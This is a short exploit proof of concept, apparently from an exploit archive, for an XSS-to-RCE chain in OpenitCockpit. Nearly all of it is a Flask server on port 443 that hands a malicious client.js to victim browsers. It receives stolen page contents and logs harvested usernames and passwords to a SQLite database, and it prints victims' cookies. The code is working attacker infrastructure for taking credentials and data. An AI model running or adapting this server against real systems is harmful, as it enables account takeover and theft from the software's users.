# Exploit Title: OpenitCockpit XSS to RCE - POC
# Date: 2021-08-14
# Exploit Author: Youssef B
# Tested against: OpenitCockpit

from flask import Flask, request, send_file
from db import create_conn, insert_content, create_db, insert_creds
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')

@app.route('/content', methods=['POST'])
def content():
    conn = create_conn(database)
    create_db(conn)

    cnt = request.form.get('content')
    url = request.form.get('url')

    if cnt and url:
        print(f"[+] Received page: {url}")
    
    print("[+]")
    print(f"[+] Inserting into database content from: {url}")
    insert_content(conn, (url, cnt))
    conn.commit()
    return ""

@app.route('/credentials', methods=['POST'])
def credentials():
    conn = create_conn(database)
    create_db(conn)
    
    print(request.cookies)

    username = request.form["data[LoginUser][username]"]
    password = request.form["data[LoginUser][password]"]

    print(f"[+] Inserting credentials into database: {username}:{password}")
    insert_creds(conn, (username, password))
    conn.commit()
    return ""

@app.route('/cookies', methods=['GET'])
def cookies():

    print(f"[+] Sending Cookies")
    return ""

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
